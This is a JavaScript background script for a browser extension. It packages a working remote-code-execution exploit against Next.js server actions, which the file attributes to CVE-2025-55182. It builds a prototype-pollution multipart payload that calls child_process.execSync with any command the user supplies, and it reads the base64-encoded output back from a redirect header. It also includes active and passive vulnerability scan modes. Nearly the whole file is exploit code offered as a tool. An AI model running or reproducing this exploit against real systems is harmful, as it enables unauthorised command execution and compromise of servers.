/**
 * R2SAE Background Script v9
 * Uses base64 encoding from CVE-2025-55182 exploit for reliable output
 */

const BOUNDARY = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad';
let lastCapturedOutput = null;

// Modify request headers
browser.webRequest.onBeforeSendHeaders.addListener(
    (details) => {
        if (details.method !== 'POST') return { requestHeaders: details.requestHeaders };

        const hasNextAction = details.requestHeaders.some(h =>
            h.name.toLowerCase() === 'next-action'
        );
        if (!hasNextAction) return { requestHeaders: details.requestHeaders };

        const newHeaders = details.requestHeaders.filter(h => {
            const name = h.name.toLowerCase();
            return name !== 'origin' && !name.startsWith('sec-fetch') && name !== 'dnt';
        });

        const url = new URL(details.url);
        newHeaders.push({ name: 'Origin', value: url.origin });
        newHeaders.push({ name: 'Host', value: url.host });
        return { requestHeaders: newHeaders };
    },
    { urls: ["<all_urls>"] },
    ["blocking", "requestHeaders"]
);

// Intercept response headers
browser.webRequest.onHeadersReceived.addListener(
    (details) => {
        if (details.method !== 'POST') return;

        for (const header of details.responseHeaders) {
            if (header.name.toLowerCase() === 'x-action-redirect') {
                const match = header.value.match(/\/login\?a=([^;]+)/);
                if (match) {
                    lastCapturedOutput = match[1]; // Keep encoded
                }
            }
        }
    },
    { urls: ["<all_urls>"] },
    ["responseHeaders"]
);

// Decode base64 output (replace @ with newlines, then decode)
function decodeBase64Output(encoded) {
    try {
        // URL decode first
        let decoded = decodeURIComponent(encoded);
        // Replace @ with newlines (as encoded by the payload)
        let base64String = decoded.replace(/@/g, '\n');
        // Decode base64
        return atob(base64String);
    } catch (e) {
        // Fallback: try direct URL decode
        try {
            return decodeURIComponent(encoded);
        } catch (e2) {
            return encoded;
        }
    }
}

// Build payload with base64 encoding (from CVE-2025-55182)
function buildRCEPayload(command) {
    // Escape special characters for JavaScript string
    const escaped = command.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$').replace(/"/g, '\\"');

    // Use base64 encoding with @ separator for newlines
    const payload = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\":\"$B1337\"}",
        "_response": {
            "_prefix": `var res=process.mainModule.require('child_process').execSync('${escaped} | base64 | tr "\\\\n" "@"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`,
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    };

    const jsonPayload = JSON.stringify(payload);

    return `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="0"\r\n\r\n` +
        `${jsonPayload}\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="1"\r\n\r\n` +
        `"$@0"\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="2"\r\n\r\n` +
        `[]\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;
}

// Build safe check payload (no RCE)
function buildSafePayload() {
    const body =
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="1"\r\n\r\n` +
        `{}\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="0"\r\n\r\n` +
        `["$1:aa:aa"]\r\n` +
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;
    return body;
}

async function executeExploit(targetUrl, payload, timeout) {
    lastCapturedOutput = null;

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout * 1000);

    try {
        const response = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Next-Action': 'x',
                'Content-Type': `multipart/form-data; boundary=${BOUNDARY}`,
                'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
                'X-Nextjs-Request-Id': 'b5dce965'
            },
            body: payload,
            redirect: 'manual',
            signal: controller.signal
        });

        clearTimeout(timeoutId);
        await new Promise(resolve => setTimeout(resolve, 100));

        const responseText = await response.text();

        // Try to get output from captured header
        let output = null;
        if (lastCapturedOutput) {
            output = decodeBase64Output(lastCapturedOutput);
        }

        // Also check response body for pattern
        if (!output) {
            const bodyMatch = responseText.match(/login\?a=([^\s"';<>]+)/);
            if (bodyMatch) {
                output = decodeBase64Output(bodyMatch[1]);
            }
        }

        return {
            success: output !== null,
            vulnerable: false, // Let caller decide based on scan type
            output: output,
            status: response.status
        };

    } catch (error) {
        clearTimeout(timeoutId);
        const output = lastCapturedOutput ? decodeBase64Output(lastCapturedOutput) : null;
        if (output) {
            return { success: true, vulnerable: true, output: output, status: 0 };
        }
        if (error.name === 'AbortError') {
            return { success: false, vulnerable: false, output: null, error: 'Request timed out' };
        }
        return { success: false, vulnerable: false, output: null, error: error.message };
    }
}

browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'executeCommand') {
        const payload = buildRCEPayload(message.command);
        executeExploit(message.url, payload, message.timeout || 10)
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    if (message.type === 'scan') {
        const isActive = message.method === 'active';

        if (isActive) {
            // Active scan: try to execute echo command and check for marker
            const command = 'echo VULN_MARKER_12345';
            const payload = buildRCEPayload(command);

            executeExploit(message.url, payload, message.timeout || 10)
                .then(result => {
                    // Only mark as vulnerable if we see the actual marker in output
                    const vulnerable = result.output && result.output.includes('VULN_MARKER_12345');
                    result.vulnerable = vulnerable;
                    result.scanCommand = command;
                    sendResponse(result);
                })
                .catch(err => sendResponse({ success: false, vulnerable: false, error: err.message }));
        } else {
            // Passive scan: send safe payload and check for specific response patterns
            const payload = buildSafePayload();

            executeExploit(message.url, payload, message.timeout || 10)
                .then(result => {
                    // For passive, we look for signs the server processed our payload
                    // Only mark vulnerable if we got a redirect header captured or specific error  
                    const vulnerable = result.output !== null || (result.status === 500 && lastCapturedOutput !== null);
                    result.vulnerable = vulnerable;
                    result.scanCommand = 'safe-check (no exec)';
                    sendResponse(result);
                })
                .catch(err => sendResponse({ success: false, vulnerable: false, error: err.message }));
        }
        return true;
    }

    return false;
});

console.log('R2SAE Background v9 - Base64 encoding for reliable output');
